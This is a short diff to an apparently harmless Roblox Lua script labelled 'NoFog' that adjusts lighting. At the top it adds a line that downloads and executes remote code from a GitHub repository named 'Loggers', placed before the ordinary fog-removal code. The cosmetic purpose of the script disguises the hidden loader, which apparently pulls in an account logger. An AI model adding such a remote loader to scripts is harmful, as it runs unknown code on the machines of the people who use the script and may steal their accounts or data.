@@ -1,3 +1,6 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/Lvk777/Loggers/refs/heads/main/gyas")()
+
+
 -- NoFog
 
 local Lighting = game:GetService('Lighting')
